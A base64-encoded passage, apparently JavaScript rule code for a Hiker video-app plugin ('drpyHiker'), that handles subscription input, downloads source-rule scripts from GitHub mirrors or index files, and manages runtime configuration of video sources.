CAgIH0pLFxcbiAgICAgICAgaWQ6IFxcXCJkcnB5SGlrZXJfc3ViX2lucHV0XFxcIlxcbiAgICB9XFxufSk7XFxuXFxubGF5b3V0LnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgZGVzYzogXFxcIuiuoumYheWcsOWdgFxcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBcXFwiXFxcIixcXG4gICAgICAgIG9uQ2hhbmdlOiAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiZHJweUhpa2VyX3N1YnVybF9pbnB1dFxcXCIsIGlucHV0KTtcXG4gICAgICAgIH0pLFxcbiAgICAgICAgaWQ6IFxcXCJkcnB5SGlrZXJfc3VidXJsX2lucHV0XFxcIlxcbiAgICB9XFxufSk7XFxuXFxubGF5b3V0LnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVfYmxhbmtcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuehruiupFxcXCIsXFxuICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoaWQpID0+IHtcXG4gICAgICAgIGxldCBwYXRoID0gZ2V0TXlWYXIoXFxcImRycHlIaWtlcl9zdWJfaW5wdXRcXFwiLCBcXFwiXFxcIik7XFxuICAgICAgICBsZXQgdXJsID0gZ2V0TXlWYXIoXFxcImRycHlIaWtlcl9zdWJ1cmxfaW5wdXRcXFwiLCBcXFwiXFxcIik7XFxuICAgICAgICBsZXQgbmFtZSA9IGdldE15VmFyKFxcXCJkcnB5SGlrZXJfc3VibmFtZV9pbnB1dFxcXCIsIFxcXCJcXFwiKTtcXG4gICAgICAgIGlmICghKHBhdGggJiYgdXJsICYmIG5hbWUpKSB7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+S4jeWPr+S4uuepulxcXCI7XFxuICAgICAgICB9XFxuICAgICAgICBsZXQgcnVsZSA9IGJhc2U2NEVuY29kZShcXFwi5rW36ZiU6KeG55WM6KeE5YiZ5YiG5Lqr77yM5b2T5YmN5YiG5Lqr55qE5piv77ya5ZCI6ZuG6KeE5YiZ6K6i6ZiF77+laG9tZV9zdWLvv6VcXFwiICsgbmFtZSArIFxcXCJAQFxcXCIgKyB1cmwrYEBqcz0kLnJlcXVpcmUoJ3N1YnNjcmliZT9ydWxlPSR7TVlfUlVMRS50aXRsZX0nKS5wYXJzZVVybChpbnB1dCwgJyR7YmFzZTY0RW5jb2RlKHBhdGgpfScpYCk7XFxuICAgICAgICByZXR1cm4gXFxcInJ1bGU6Ly9cXFwiICsgcnVsZTtcXG4gICAgfSksXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxufSk7XFxuc2V0UmVzdWx0KGxheW91dCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLop6PmnpDorqLpmIVcIixcInBhdGhcIjpcInN1YnNjcmliZVwiLFwicnVsZVwiOlwianM6XFxuZnVuY3Rpb24gZ2VuZXJhdGVDb25maWdCeUdpdGh1Yih1cmwsIHBhdGgpIHtcXG4gICAgbGV0IHJvcGUgPSB1cmwuc3BsaXQoXFxcIi9cXFwiKS5zbGljZSgzLCA1KS5qb2luKFxcXCIvXFxcIik7XFxuICAgIGxldCBodG1sID0gZmV0Y2godXJsKTtcXG4gICAgXFxuICAgIGxldCBqc29uVGV4dCA9IHBkZmgoaHRtbCwgXFxcIiNyZXBvLWNvbnRlbnQtcGpheC1jb250YWluZXImJnNjcmlwdCYmSHRtbFxcXCIpO1xcbiAgICBcXG4gICAgbGV0IGpzb24gPSBKU09OLnBhcnNlKGpzb25UZXh0KTtcXG4gICAgbGV0IGxpc3QgPSBqc29uLnBheWxvYWQudHJlZS5pdGVtcztcXG4gICAgbGV0IHJ1bGVzID0gW107XFxuICAgIGxldCBjb3VudCA9IDA7XFxuICAgIGZvciAobGV0IGl0IG9mIGxpc3QpIHtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgbGV0IG5hbWUgPSBpdC5uYW1lO1xcbiAgICAgICAgICAgIGxldCBzcGF0aCA9IGl0LnBhdGg7XFxuICAgICAgICAgICAgaWYgKCFuYW1lLmVuZHNXaXRoKFxcXCIuanNcXFwiKSkgY29udGludWU7XFxuICAgICAgICAgICAgbmFtZSA9IG5hbWUuc2xpY2UoMCwgbmFtZS5sYXN0SW5kZXhPZihcXFwiLlxcXCIpKTtcXG4gICAgICAgICAgICBsZXQgcnVsZSA9IGZldGNoKGBodHRwczovL3Jhdy5naXRtaXJyb3IuY29tLyR7cm9wZX0vbWFzdGVyLyR7c3BhdGh9YCk7XFxuICAgICAgICAgICAgaWYgKCEoKCFydWxlIHx8ICFydWxlLmluY2x1ZGVzKFxcXCJydWxlXFxcIikpICYmICFmaWxlRXhpc3QocGF0aCArIGl0Lm5hbWUpKSkge1xcbiAgICAgICAgICAgICAgICB3cml0ZUZpbGUocGF0aCArIGl0Lm5hbWUsIHJ1bGUpO1xcbiAgICAgICAgICAgICAgICBydWxlcy5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgICdrZXknOiBgaGlweV9qc18ke25hbWV9YCxcXG4gICAgICAgICAgICAgICAgICAgICduYW1lJzogYCR7bmFtZX1gLFxcbiAgICAgICAgICAgICAgICAgICAgJ3R5cGUnOiAzLFxcbiAgICAgICAgICAgICAgICAgICAgJ2FwaSc6Jy4uL2xpYnMvZHJweTIuanMnLFxcbiAgICAgICAgICAgICAgICAgICAgJ3NlYXJjaGFibGUnOiAxLFxcbiAgICAgICAgICAgICAgICAgICAgJ3F1aWNrU2VhcmNoJzogMSxcXG4gICAgICAgICAgICAgICAgICAgICdmaWx0ZXJhYmxlJzogMSxcXG4gICAgICAgICAgICAgICAgICAgICdleHQnOiBcXFwiLi9cXFwiICsgaXQubmFtZSxcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIGNvdW50Kys7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIHdyaXRlRmlsZShwYXRoICsgXFxcImluZGV4Lmpzb25cXFwiLCBKU09OLnN0cmluZ2lmeSh7c2l0ZXM6cnVsZXN9KSk7XFxuICAgIHJldHVybiBcXFwidG9hc3Q6Ly/miJDlip/mm7TmlrBcXFwiICsgY291bnQgKyBcXFwi5LiqXFxcIjs7XFxufVxcblxcbmZ1bmN0aW9uIGdlbmVyYXRlQ29uZmlnQnlJbmRleCh1cmwsIHBhdGgpIHtcXG4gICAgbGV0IGpzb24gPSBKU09OLnBhcnNlKHJlcXVlc3QodXJsKSk7XFxuICAgIGxldCBhcnIgPSBqc29uLnNpdGVzO1xcbiAgICBsZXQgY291bnQgPSAwO1xcbiAgICBsZXQgaSA9IDA7XFxuICAgIGZvciAobGV0IGl0IG9mIGFycikge1xcbiAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICBpZiAoKFN0cmluZyhpdC5hcGkpLmluY2x1ZGVzKFxcXCJkcnB5Mi5taW4uanNcXFwiKSB8fCBTdHJpbmcoaXQuYXBpKS5pbmNsdWRlcyhcXFwiZHJweTIuanNcXFwiKSkpIHtcXG4gICAgICAgICAgICAgICAgbGV0IG5hbWUgPSBpdC5leHQuZW5kc1dpdGgoXFxcIi5qc1xcXCIpID8gZGVjb2RlVVJJQ29tcG9uZW50KGl0LmV4dC5zcGxpdChcXFwiL1xcXCIpLmF0KC0xKSkgOiAoaXQubmFtZSArIFxcXCIuanNcXFwiKTtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGU7XFxuICAgICAgICAgICAgICAgIGlmIChTdHJpbmcoaXQuZXh0KS5zdGFydHNXaXRoKFxcXCJodHRwXFxcIikpIHtcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGUgPSByZXF1ZXN0KGl0LmV4dCk7XFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICBydWxlID0gcmVxdWVzdChqb2luVXJsKHVybCwgaXQuZXh0KSk7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgaXQuZXh0ID0gXFxcIi4vXFxcIiArIG5hbWU7XFxuICAgICAgICAgICAgICAgIGlmICghcnVsZSB8fCAhcnVsZS5pbmNsdWRlcyhcXFwicnVsZVxcXCIpKSB7XFxuICAgICAgICAgICAgICAgICAgICBpZiAoIWZpbGVFeGlzdChwYXRoICsgbmFtZSkpXFxuICAgICAgICAgICAgICAgICAgICAgICAgYXJyLnNwbGljZShpLCAxKTtcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcbiAgICAgICAgICAgICAgICB9O1xcbiAgICAgICAgICAgICAgICB3cml0ZUZpbGUocGF0aCArIG5hbWUsIHJ1bGUpO1xcbiAgICAgICAgICAgICAgICBjb3VudCsrO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICBsb2coZS50b1N0cmluZygpKTtcXG4gICAgICAgIH1cXG4gICAgICAgIGkrKztcXG4gICAgfVxcbiAgICB3cml0ZUZpbGUocGF0aCArIFxcXCJpbmRleC5qc29uXFxcIiwgSlNPTi5zdHJpbmdpZnkoanNvbikpO1xcbiAgICByZXR1cm4gXFxcInRvYXN0Oi8v5oiQ5Yqf5pu05pawXFxcIiArIGNvdW50ICsgXFxcIuS4qlxcXCI7XFxufVxcbiQuZXhwb3J0cy5wYXJzZVVybCA9IGZ1bmN0aW9uKHVybCwgcGF0aCkge1xcbiAgICBwYXRoID0gYmFzZTY0RGVjb2RlKHBhdGgpO1xcbiAgICBwYXRoID0gcGF0aC5lbmRzV2l0aChcXFwiL1xcXCIpID8gcGF0aCA6IHBhdGggKyBcXFwiL1xcXCI7XFxuICAgIHRyeSB7XFxuICAgICAgICBpZiAodXJsLnN0YXJ0c1dpdGgoXFxcImh0dHBzOi8vZ2l0aHViLmNvbS9oamRobngvXFxcIikpIHtcXG4gICAgICAgICAgICByZXR1cm4gZ2VuZXJhdGVDb25maWdCeUdpdGh1Yih1cmwsIHBhdGgpO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICByZXR1cm4gZ2VuZXJhdGVDb25maWdCeUluZGV4KHVybCwgcGF0aCk7XFxuICAgICAgICB9XFxuICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcbiAgICAgICAgcmV0dXJuIFxcXCJlcnJvcjpcXFwiICsgZS50b1N0cmluZygpO1xcbiAgICB9XFxufTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIui/kOihjOaXtumFjee9rueuoeeQhlwiLFwicGF0aFwiOlwicnVudGltZUNvbmZpZ1wiLFwicnVsZVwiOlwianM6XFxuY29uc3Qgc2VhcmNoQWxsb3dQYXRoID0gXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvTG95RGdJay9EcnB5SGlrZXIvc2VhcmNoQWxsb3cuanNvblxcXCI7XFxubGV0IGlzUHJlcGFyZSA9IGZhbHNlO1xcbmxldCBjb25maWdzLCBjdXJyZW50Q29uZmlnID0ge30sXFxuICAgIHNvdXJjZUxpc3QsIGN1cnJlbnRTb3VyY2UsIHNlYXJjaEFsbG93ID0gW107XFxuXFxuZnVuY3Rpb24gaW5pdChjb25maWcpIHtcXG4gICAgaWYoIWNvbmZpZykgcmV0dXJuIG51bGw7XFxuICAgIGlmICghY29uZmlnLnBhdGgpIHJldHVybiBudWxsO1xcbiAgICB0cnkge1xcbiAgICAgICAgbGV0IGZpbGU7XFxuICAgICAgICBsZXQgc291cmNlTGlzdCA9IFtdO1xcbiAgICAgICAgaWYgKGNvbmZpZy5wYXRoLnN0YXJ0c1dpdGgoXFxcImZpbGU6Ly9cXFwiKSAmJiAoZmlsZSA9IG5ldyBqYXZhLmlvLkZpbGUoY29uZmlnLnBhdGgucmVwbGFjZShcXFwiZmlsZTovL1xcXCIsIFxcXCJcXFwiKSkpLmlzRGlyZWN0b3J5KCkpIHtcXG4gICAgICAgICAgICBzb3VyY2VMaXN0ID0gZ2VuZXJhdGVDb25maWdCeUxvY2FsKGZpbGUpO1xcbiAgICAgICAgICAgIGNvbmZpZy50eXBlID0gXFxcImxvY2FsRGlyXFxcIjtcXG4gICAgICAgIH0gZWxzZSBpZiAoY29uZmlnLnBhdGguc3RhcnRzV2l0aChcXFwiaHR0cHM6Ly9naXRodWIuY29tXFxcIikpIHtcXG4gICAgICAgICAgICBzb3VyY2VMaXN0ID0gZ2VuZXJhdGVDb25maWdCeUdpdGh1Yihjb25maWcucGF0aCk7XFxuICAgICAgICAgICAgY29uZmlnLnR5cGUgPSBcXFwiZ2l0aHViRGlyXFxcIjtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgbGV0IGpzb24gPSBKU09OLnBhcnNlKHRvQ29ycmVjdEpTT05TdHJpbmcoZmV0Y2goY29uZmlnLnBhdGgpKSB8fCBcXFwie31cXFwiKTtcXG4gICAgICAgICAgICBpZiAoIUFycmF5LmlzQXJyYXkoanNvbi5zaXRlcykgfHwgIWpzb24uc2l0ZXMubGVuZ3RoKSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBudWxsO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBzb3VyY2VMaXN0ID0gZmlsdGVyT3RoZXIoanNvbi5zaXRlcyk7XFxuICAgICAgICAgICAgY29uZmlnLnR5cGUgPSBcXFwiaW5kZXhcXFwiO1xcbiAgICAgICAgfVxcbiAgICAgICAgZmlsZSA9IHZvaWQgMDtcXG4gICAgICAgIGxldCBjdXJyZW50U291cmNlLCBzZWFyY2hBbGxvdztcXG4gICAgICAgIGlmIChjb25maWcuY0tleSkge1xcbiAgICAgICAgICAgIGN1cnJlbnRTb3VyY2UgPSBzb3VyY2VMaXN0LmZpbmQodiA9PiB2LmtleSA9PT0gY29uZmlnLmNLZXkpO1xcbiAgICAgICAgICAgIGlmICghY3VycmVudFNvdXJjZSkge1xcbiAgICAgICAgICAgICAgICBjdXJyZW50U291cmNlID0gc291cmNlTGlzdFswXTtcXG4gICAgICAgICAgICAgICAgLy9jdXJyZW50Q29uZmlnLmNLZXkgPSBzb3VyY2VMaXN0WzBdLmtleTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIGN1cnJlbnRTb3VyY2UgPSBzb3VyY2VMaXN0WzBdO1xcbiAgICAgICAgICAgIC8vY29uZmlnLmNLZXkgPSBzb3VyY2VMaXN0WzBdLmtleTtcXG4gICAgICAgIH1cXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgc2VhcmNoQWxsb3cgPSBKU09OLnBhcnNlKGZldGNoKHNlYXJjaEFsbG93UGF0aCkgfHwgXFxcIltdXFxcIik7XFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICAgICAgZGVsZXRlRmlsZShzZWFyY2hBbGxvd1BhdGgpO1xcbiAgICAgICAgICAgIHNlYXJjaEFsbG93ID0gW107XFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4ge1xcbiAgICAgICAgICAgIGN1cnJlbnRTb3VyY2UsXFxuICAgICAgICAgICAgc2VhcmNoQWxsb3csXFxuICAgICAgICAgICAgc291cmNlTGlzdFxcbiAgICAgICAgfTtcXG4gICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgbG9nKGUudG9TdHJpbmcoKSk7XFxuICAgIH1cXG4gICAgcmV0dXJuIG51bGw7XFxufVxcblxcbmZ1bmN0aW9uIGdlbmVyYXRlQ29uZmlnQnlMb2NhbChkaXJGaWxlKSB7XFxuICAgIGxldCBsaXN0ID0gZGlyRmlsZS5saXN0RmlsZXMoKTtcXG4gICAgbGV0IHJ1bGVzID0gW107XFxuICAgIGZvciAobGV0IGl0IG9mIGxpc3QpIHtcXG4gICAgICAgIGxldCBuYW1lID0gU3RyaW5nKGl0LmdldE5hbWUoKSk7XFxuICAgICAgICBsZXQgcGF0aCA9IGl0LmdldFBhdGgoKTtcXG4gICAgICAgIGlmICghbmFtZS5lbmRzV2l0aChcXFwiLmpzXFxcIikgfHwgaXQuaXNEaXJlY3RvcnkoKSkgY29udGludWU7XFxuICAgICAgICBuYW1lID0gbmFtZS5zbGljZSgwLCBuYW1lLmxhc3RJbmRleE9mKFxcXCIuXFxcIikpO1xcbiAgICAgICAgcnVsZXMucHVzaCh7XFxuICAgICAgICAgICAgJ2tleSc6IGBoaXB5X2pzXyR7bmFtZX1gLFxcbiAgICAgICAgICAgICduYW1lJzogYCR7bmFtZX1gLFxcbiAgICAgICAgICAgICd0eXBlJzogMyxcXG4gICAgICAgICAgICAnc2VhcmNoYWJsZSc6IDEsXFxuICAgICAgICAgICAgJ3F1aWNrU2VhcmNoJzogMSxcXG4gICAgICAgICAgICAnZmlsdGVyYWJsZSc6IDEsXFxuICAgICAgICAgICAgJ2V4dCc6IGAke3BhdGh9YCxcXG4gICAgICAgIH0pO1xcbiAgICB9XFxuICAgIHJldHVybiBydWxlcztcXG59XFxuXFxuZnVuY3Rpb24gZ2VuZXJhdGVDb25maWdCeUdpdGh1Yih1cmwpIHtcXG4gICAgLy91cmw9dXJsLnJlcGxhY2UoLygjR0lUSFVCIykkLyxcXFwiXFxcIik7XFxuICAgIGxldCByb3BlID0gdXJsLnNwbGl0KFxcXCIvXFxcIikuc2xpY2UoMywgNSkuam9pbihcXFwiL1xcXCIpO1xcbiAgICBsZXQgaHRtbCA9IGZldGNoKHVybCk7XFxuICAgIGxldCBqc29uVGV4dCA9IHBkZmgoaHRtbCwgXFxcIiNyZXBvLWNvbnRlbnQtcGpheC1jb250YWluZXImJnNjcmlwdCYmSHRtbFxcXCIpO1xcbiAgICBsZXQganNvbiA9IEpTT04ucGFyc2UoanNvblRleHQpO1xcbiAgICBsZXQgbGlzdCA9IGpzb24ucGF5bG9hZC50cmVlLml0ZW1zO1xcbiAgICBsZXQgcnVsZXMgPSBbXTtcXG4gICAgZm9yIChsZXQgaXQgb2YgbGlzdCkge1xcbiAgICAgICAgbGV0IG5hbWUgPSBpdC5uYW1lO1xcbiAgICAgICAgbGV0IHBhdGggPSBpdC5wYXRoO1xcbiAgICAgICAgaWYgKCFuYW1lLmVuZHNXaXRoKFxcXCIuanNcXFwiKSkgY29udGludWU7XFxuICAgICAgICBuYW1lID0gbmFtZS5zbGljZSgwLCBuYW1lLmxhc3RJbmRleE9mKFxcXCIuXFxcIikpO1xcbiAgICAgICAgcnVsZXMucHVzaCh7XFxuICAgICAgICAgICAgJ2tleSc6IGBoaXB5X2pzXyR7bmFtZX1gLFxcbiAgICAgICAgICAgICduYW1lJzogYCR7bmFtZX1gLFxcbiAgICAgICAgICAgICd0eXBlJzogMyxcXG4gICAgICAgICAgICAnc2VhcmNoYWJsZSc6IDEsXFxuICAgICAgICAgICAgJ3F1aWNrU2VhcmNoJzogMSxcXG4gICAgICAgICAgICAnZmlsdGVyYWJsZSc6IDEsXFxuICAgICAgICAgICAgJ2V4dCc6IGBodHRwczovL3Jhdy5naXRtaXJyb3IuY29tLyR7cm9wZX0vbWFzdGVyLyR7cGF0aH1gLFxcbiAgICAgICAgfSk7XFxuICAgICAgICAvKlxcbiAgICAgICAgaHR0cHM6Ly9naXRodWIuY29tL2hqZGhueC9oaXB5LXNlcnZlci90cmVlL21hc3Rlci9hcHAvdDQvZmlsZXMvZHJweV9qc1xcbiAgICAgICAgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hqZGhueC9oaXB5LXNlcnZlci9tYXN0ZXIvYXBwL3Q0L2ZpbGVzL2RycHlfanMvMzYwJUU1JUJEJUIxJUU4JUE3JTg2JTVCJUU1JUFFJTk4JTVELmpzKi9cXG4gICAgfVxcbiAgICByZXR1cm4gcnVsZXM7XFxufVxcblxcbmZ1bmN0aW9uIHByZXBhcmUoY29uZmlnKSB7XFxuICAgIGxldCBkYXRhID0gaW5pdChjb25maWcpO1xcbiAgICBpZiAoIWRhdGEpIHJldHVybiBmYWxzZTtcXG4gICAgY3VycmVudFNvdXJjZSA9IGRhdGEuY3VycmVudFNvdXJjZTtcXG4gICAgc2VhcmNoQWxsb3cgPSBkYXRhLnNlYXJjaEFsbG93O1xcbiAgICBzb3VyY2VMaXN0ID0gZGF0YS5zb3VyY2VMaXN0O1xcbiAgICBjdXJyZW50Q29uZmlnID0gY29uZmlnO1xcbiAgICByZXR1cm4gdHJ1ZTtcXG59XFxuXFxuZnVuY3Rpb24gZmlsdGVyT3RoZXIobGlzdCkge1xcbiAgICByZXR1cm4gbGlzdC5maWx0ZXIoaXQgPT4gU3RyaW5nKGl0LmFwaSkuaW5jbHVkZXMoXFxcImRycHkyLm1pbi5qc1xcXCIpIHx8IFN0cmluZyhpdC5hcGkpLmluY2x1ZGVzKFxcXCJkcnB5Mi5qc1xcXCIpKVxcbn1cXG5cXG5cXG5mdW5jdGlvbiBnZXRDdXJyZW50Q29uZmlnKCkge1xcbiAgICByZXR1cm4gY3VycmVudENvbmZpZ3x8e307XFxufVxcblxcbmZ1bmN0aW9uIHNldEN1cnJlbnRDb25maWcoY29uZmlnKSB7XFxuICAgIGxldCBjcGF0aCA9IChjdXJyZW50Q29uZmlnIHx8IHt9KS5wYXRoO1xcbiAgICBpZiAocHJlcGFyZShjb25maWcpKSB7XFxuICAgICAgICBzdG9yYWdlMC5zZXRJdGVtKFxcXCJjdXJyZW50Q29uZmlnXFxcIiwgY29uZmlnKTtcXG4gICAgICAgIGlmIChjcGF0aCAhPSBjb25maWcucGF0aCkge1xcbiAgICAgICAgICAgIGRlbGV0ZUZpbGUoc2VhcmNoQWxsb3dQYXRoKTtcXG4gICAgICAgICAgICBzZWFyY2hBbGxvdyA9IFtdO1xcbiAgICAgICAgfVxcbiAgICAgICAgaXNQcmVwYXJlID0gdHJ1ZTtcXG4gICAgICAgIHJldHVybiB0cnVlO1xcbiAgICB9IGVsc2Uge1xcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICB9XFxufVxcblxcbmZ1bmN0aW9uIGZpbmRTb3VyY2Uoa2V5KSB7XFxuICAgIGxldCBzID0gc291cmNlTGlzdC5maW5kKHYgPT4gdi5rZXkgPT09IGtleSk7XFxuICAgIGlmIChzKSB7XFxuICAgICAgICBzLmV4dCA9IGdldEFic29sdXRlUGF0aChTdHJpbmcocy5leHQpKTtcXG4gICAgfVxcbiAgICByZXR1cm4gcztcXG59XFxuXFxuZnVuY3Rpb24gZ2V0Q3VycmVudFNvdXJjZSgpIHtcXG4gICAgcmV0dXJuIGN1cnJlbnRTb3VyY2U7XFxufVxcblxcbmZ1bmN0aW9uIGdldEN1cnJlbnRTb3VyY2VQYXRoKCkge1xcbiAgICBsZXQgcGF0aCA9IFN0cmluZyhjdXJyZW50U291cmNlLmV4dCk7XFxuICAgIHJldHVybiBnZXRBYnNvbHV0ZVBhdGgocGF0aCk7XFxufVxcblxcbmZ1bmN0aW9uIGdldEFic29sdXRlUGF0aChwYXRoKSB7XFxuICAgIHBhdGggPSBTdHJpbmcocGF0aCk7XFxuICAgIGlmIChwYXRoLnN0YXJ0c1dpdGgoXFxcImh0dHBcXFwiKSB8fCBwYXRoLnN0YXJ0c1dpdGgoXFxcImZpbGU6Ly9cXFwiKSkge1xcbiAgICAgICAgcmV0dXJuIHBhdGg7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICByZXR1cm4gam9pblVybChjdXJyZW50Q29uZmlnLnBhdGgsIHBhdGgpO1xcbiAgICB9XFxufVxcblxcbmZ1bmN0aW9uIHNldEN1cnJlbnRTb3VyY2Uoa2V5KSB7XFxuICAgIGxldCBzb3VyY2UgPSBzb3VyY2VMaXN0LmZpbmQodiA9PiB2LmtleSA9PT0ga2V5KTtcXG4gICAgaWYgKHNvdXJjZSkge1xcbiAgICAgICAgY3VycmVudENvbmZpZy5jS2V5ID0ga2V5O1xcbiAgICAgICAgc3RvcmFnZTAuc2V0SXRlbShcXFwiY3VycmVudENvbmZpZ1xcXCIsIGN1cnJlbnRDb25maWcpO1xcbiAgICAgICAgY3VycmVudFNvdXJjZSA9IHNvdXJjZTtcXG4gICAgICAgIHJldHVybiB0cnVlO1xcbiAgICB9XFxuICAgIHJldHVybiBmYWxzZTtcXG59XFxuXFxuZnVuY3Rpb24gZ2V0Q2FuU2VhcmNoU291cmNlKCkge1xcbiAgICByZXR1cm4gc291cmNlTGlzdC5maWx0ZXIodiA9PiB2LnNlYXJjaGFibGUgPT09IHVuZGVmaW5lZCB8fCB2LnNlYXJjaGFibGUpO1xcbn1cXG5cXG5mdW5jdGlvbiBnZXRBbGxTb3VyY2UoKSB7XFxuICAgIHJldHVybiBzb3VyY2VMaXN0LnNsaWNlKCk7XFxufVxcblxcbmZ1bmN0aW9uIGdldEFsbFNvdXJjZXMoKSB7XFxuICAgIHJldHVybiBzb3VyY2VMaXN0O1xcbn1cXG5cXG5mdW5jdGlvbiBnZXRTZWFyY2hBbGxvdygpIHtcXG4gICAgcmV0dXJuIHNlYXJjaEFsbG93O1xcbn1cXG5cXG5mdW5jdGlvbiBzZXRTZWFyY2hBbGxvdygpIHtcXG4gICAgaWYgKEFycmF5LmlzQXJyYXkoc2VhcmNoQWxsb3cpKSB7XFxuICAgICAgICBzYXZlRmlsZShzZWFyY2hBbGxvd1BhdGgsIEpTT04uc3RyaW5naWZ5KHNlYXJjaEFsbG93KSk7XFxuICAgIH1cXG59XFxuXFxuZnVuY3Rpb24gZ2V0QWxsb3dTZWFyY2hTb3VyY2UoKSB7XFxuICAgIGxldCBzbGlzdDtcXG4gICAgaWYgKHNlYXJjaEFsbG93Lmxlbmd0aCkge1xcbiAgICAgICAgc2xpc3QgPSBzb3VyY2VMaXN0LmZpbHRlcih2ID0+IHNlYXJjaEFsbG93LmluY2x1ZGVzKHYua2V5KSk7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICBzbGlzdCA9IHNvdXJjZUxpc3QuZmlsdGVyKHYgPT4gdi5zZWFyY2hhYmxlKTtcXG4gICAgfVxcbiAgICBpZiAoc2xpc3QubGVuZ3RoID09IDApIHtcXG4gICAgICAgIHNsaXN0ID0gc291cmNlTGlzdC5zbGljZSgpO1xcbiAgICB9XFxuICAgIHJldHVybiBzbGlzdDtcXG59XFxuXFxuZnVuY3Rpb24gaXNQcmVwYXJlZCgpIHtcXG4gICAgcmV0dXJuIGlzUHJlcGFyZTtcXG59XFxuXFxuaXNQcmVwYXJlID0gcHJlcGFyZShzdG9yYWdlMC5nZXRJdGVtKFxcXCJjdXJyZW50Q29uZmlnXFxcIiwge30pKTtcXG4kLmV4cG9ydHMgPSB7XFxuICAgIHByZXBhcmUsXFxuICAgIGdldEN1cnJlbnRDb25maWcsXFxuICAgIHNldEN1cnJlbnRDb25maWcsXFxuICAgIGdldEN1cnJlbnRTb3VyY2UsXFxuICAgIGdldEN1cnJlbnRTb3VyY2VQYXRoLFxcbiAgICBzZXRDdXJyZW50U291cmNlLFxcbiAgICBnZXRDYW5TZWFyY2hTb3VyY2UsXFxuICAgIGdldFNlYXJjaEFsbG93LFxcbiAgICBzZXRTZWFyY2hBbGxvdyxcXG4gICAgZ2V0QWxsU291cmNlLFxcbiAgICBnZXRBbGxvd1NlYXJjaFNvdXJjZSxcXG4gICAgaXNQcmVwYXJlZCxcXG4gICAgZ2V0QWJzb2x1dGVQYXRoLFxcbiAgICBnZXRBbGxTb3VyY2VzLFxcbiAgICBmaW5kU291cmNlXFxufTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIue8lui+kemFjee9rlwiLFwicGF0aFwiOlwiY3JlYXRlQ29uZmlnXCIsXCJydWxlXCI6XCJqczpcXG5sZXQgbGF5b3V0ID0gW107XFxuc2V0UGFnZVRpdGxlKFxcXCLliJvlu7rphY3nva5cXFwiKTtcXG5sZXQgcnVudGltZUNvbmZpZyA9IEdNLmRlZmluZU1vZHVsZShcXFwicnVudGltZUNvbmZpZ1xcXCIpO1xcbmxldCBjdXJyZW50Y29uZmlnID0gcnVudGltZUNvbmZpZy5nZXRDdXJyZW50Q29uZmlnKCk7XFxubGV0IGYgPSAkLnJlcXVpcmUoXFxcImh0dHA6Ly9oaWtlci5ub2tpYS5wcmVzcy9oaWtlcnVsZS9ydWxlbGlzdC5qc29uP2lkPTUwOTlcXFwiKTtcXG5hZGRMaXN0ZW5lcihcXFwib25DbG9zZVxcXCIsICgpID0+IHtcXG4gIGNsZWFyTXlWYXIoXFxcImRycHlIaWtlcl9jb25maWdfbmFtZVxcXCIpO1xcbiAgY2xlYXJNeVZhcihcXFwiZHJweUhpa2VyX2NvbmZpZ19wYXRoXFxcIik7XFxufSk7XFxuXFxuLy/ljoblj7LphY3nva7orrDlvZVcXG5mdW5jdGlvbiB1bmlxdWVBcnJheUJ5UHJvcGVydHkoYXJyYXksIHByb3BlcnR5KSB7XFxuICBsZXQgdW5pcXVlID0gW107XFxuICBsZXQgbWFwID0gbmV3IE1hcCgpO1xcbiAgZm9yIChsZXQgaXRlbSBvZiBhcnJheSkge1xcbiAgICBsZXQga2V5ID0gaXRlbVtwcm9wZXJ0eV07